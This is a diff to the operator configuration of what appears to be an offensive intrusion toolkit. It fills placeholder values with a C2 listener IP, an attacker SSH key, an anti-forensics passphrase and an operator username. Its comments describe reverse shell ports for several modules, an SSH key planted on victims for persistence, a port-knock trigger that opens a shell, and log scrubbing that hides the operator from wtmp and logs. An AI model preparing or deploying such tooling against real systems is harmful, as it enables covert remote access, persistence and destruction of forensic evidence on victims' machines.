@@ -55,7 +55,7 @@ banner()  { echo -e "${BOLD}${RED}$*${NC}"; }
 # ███████╗ OPERATOR CONFIG — CHANGE ALL OF THESE BEFORE DEPLOYING ███████████
 # =============================================================================
 
-ATTACKER_IP="CHANGEME"              # Your C2 / listener IP
+ATTACKER_IP="172.31.40.6"              # Your C2 / listener IP
 
 # Per-module listener ports
 DOCKER_PORT="4444"                  # DockerPoisoner reverse shell port
@@ -65,7 +65,7 @@ CHEF_PORT="4443"                    # ChefMischief reverse shell cron port
 KNOCK_CALLBACK_PORT="4448"          # KnockKnock trigger fires shell to this port
 
 # SSH public key planted by DockerPoisoner, BootStrap, and ChefMischief
-ATTACKER_SSH_PUBKEY="CHANGEME"      # Full ssh-ed25519 / ssh-rsa public key line
+ATTACKER_SSH_PUBKEY="12345678"      # Full ssh-ed25519 / ssh-rsa public key line
 
 # Port knock sequence (KnockKnock)
 KNOCK_PORT_1="7001"
@@ -73,8 +73,8 @@ KNOCK_PORT_2="7002"
 KNOCK_PORT_3="7003"
 
 # AntiForensics (VanishingAct)
-VANISHINGACT_PASSPHRASE="CHANGEME"  # Passphrase required to run antiforensics
-OPERATOR_USER="CHANGEME"            # Your operator username — scrubbed from wtmp/logs
+VANISHINGACT_PASSPHRASE="12345678"  # Passphrase required to run antiforensics
+OPERATOR_USER="admin"            # Your operator username — scrubbed from wtmp/logs
 
 # =============================================================================
 # ███████████████████████████ END OPERATOR CONFIG ████████████████████████████
